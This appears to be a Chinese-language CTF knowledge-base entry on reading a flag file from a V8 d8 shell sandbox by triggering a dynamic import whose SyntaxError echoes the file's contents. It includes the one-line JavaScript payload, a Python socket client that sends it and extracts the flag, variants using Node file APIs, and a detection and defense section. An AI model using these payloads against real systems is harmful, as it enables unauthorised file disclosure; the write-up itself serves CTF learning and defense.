---
id: ctf-misc-v8-d8-dynamic-import-syntax-error-file-read
title: V8 d8 沙盒文件读取侧信道：import('./flag') 语法错误回显文件内容
type: scenario
domain: ctf
path: ctf/misc
technique: v8-d8-dynamic-import-syntax-error-file-read
aliases:
- d8 沙盒逃逸
- import("./flag")
- V8 语法错误泄露
- d8 文件读取
- JavaScript 引擎侧信道
- 这……这是js？
tags:
- ctf
- misc
- v8
- d8
- javascript
- dynamic-import
- syntax-error
- side-channel
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:56:07+08:00'
  notes: 已对照原文 §这……这是js? 核对：d8/chroot、动态 import('./flag')、SyntaxError 回显源码行、void+.catch 保留输出、chroot 后 ./flag 644 均一致；未本机复跑。
---

## 一句话结论

在只提供 V8 `d8` 交互式 shell、没有 shell 命令的沙盒里，`import("./flag")` 会让 V8 模块加载器读取 `./flag` 并按 JavaScript 模块解析；flag 内容不是合法 JS，解析失败时 `SyntaxError` 会把出错源码行（即 flag 内容）回显到 stderr，从而把文件内容带出来。

## 原理

- `d8` 是 V8 的 standalone JavaScript shell，支持动态 `import()`；模块加载器可以读取本地文件（取决于启动参数与沙盒限制）。
- `import("./flag")` 不要求目标文件是合法模块：V8 会先读取文件内容，再按模块语法解析；解析失败时错误信息通常包含文件名、行号和出错源码行。
- flag 形如 `NepCTF{...}`，其中 `{` 在 JS 语法中是非法的（除非在特定上下文），因此解析会抛出 `SyntaxError: Unexpected token '{'`，并把整行 flag 作为错误上下文打印。
- `void` 让表达式不返回值；`.catch(function(){})` 捕获 Promise rejection，避免未捕获异常导致 d8 进程退出，从而保留错误输出。
- 根因是沙盒只限制了“执行命令”，却没有限制 JS 引擎自身的文件读取/模块加载能力；错误信息成为读文件侧信道。

## 触发条件

- 目标提供 `d8`/V8 shell 或类似 JS 引擎交互接口，且允许动态 `import()` 读取本地文件。
- flag 文件在可读路径（案例 `./flag`，权限 644），内容不是合法 JS 模块。
- 错误输出（stderr/stdout）会回显给攻击者，且包含出错源码行。
- 没有其他文件读取 API 被禁用/过滤；chroot 只限制了根目录，不影响相对路径读取。

## 利用步骤

1. 连接 d8 shell，确认 banner/提示符与动态 import 可用。
2. 发送 `void import("./flag").catch(function(){})`；若路径未知，先尝试 `./flag`、`/flag`、`flag`。
3. 读取返回的 `SyntaxError` 输出，提取错误行中的 flag 内容；若错误信息被截断，尝试 `import("./flag?x")` 或分段读取。
4. 若 `import` 被禁用，尝试 `require`、`read`、`load`、`os.file` 等 d8 内置/扩展 API；或利用 `Error.prepareStackTrace`/`Function` 等侧信道。
5. 若目标会退出，确保 `.catch` 捕获 rejection；必要时用 `try/catch` 包裹同步加载。

## PoC

```javascript
void import("./flag").catch(function(){})
```

```python
import re, socket, ssl

PAYLOAD = b'void import("./flag").catch(function(){})\n'
FLAG = re.compile(rb"(?:NepCTF|flag)\{[^}\r\n]+\}")

ctx = ssl._create_unverified_context()
with ctx.wrap_socket(socket.create_connection((HOST, 443), timeout=15),
                     server_hostname=HOST) as conn:
    conn.settimeout(0.8)
    banner = conn.recv(4096)
    conn.sendall(PAYLOAD)
    out = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
print((banner + out).decode(errors="replace"))
print(FLAG.search(out))
```

案例输出类似：

```text
d8> //flag:1: SyntaxError: Unexpected token '{'
NepCTF{...}
      ^
SyntaxError: Unexpected token '{'
```

## 变体与关联

- 变体：Node.js 环境可用 `require('fs').readFileSync('/flag')`、`process.binding`、`import()` 等；沙盒若只禁用 `child_process` 而保留 `fs`，同样可读文件。
- 变体：错误信息不回显源码时，可用 `import()` 的模块解析错误、`new Function` 编译错误、source map 路径等侧信道逐字符推断。
- 变体：若能写文件，可把 flag 作为模块路径/URL 的一部分触发 DNS/HTTP 外带。
- 关联：[[ctf-misc-unicode-variation-selector-hex-stego]]（其他信息隐藏/提取）、[[web-generic-auth-vitest-browser-upload-arbitrary-file-read]]（JS 运行时文件读取）、[[ai-security-prompt-injection-markdown-image-url-context-exfiltration]]（通过引擎行为外带数据）。

## 检测与防御

- 防御：不要在生产环境暴露 `d8`/Node REPL/JS 引擎交互接口；沙盒应同时禁用文件系统访问、动态 import、`require`、`eval` 等能力。
- 防御：chroot/低权限用户不足以限制 JS 引擎的文件读取；使用 seccomp/landlock/容器只读挂载并移除 flag 文件。
- 防御：错误信息不要回显源码行；生产环境关闭详细语法错误/堆栈。
- 检测：d8/Node 进程出现 `import(`、`require('fs')`、`readFile` 等调用；错误日志中出现 flag 格式字符串；沙盒内异常文件访问。
- 响应：发现泄露后移除沙盒内敏感文件、禁用动态 import/文件 API，轮换 flag/密钥并审计访问日志。
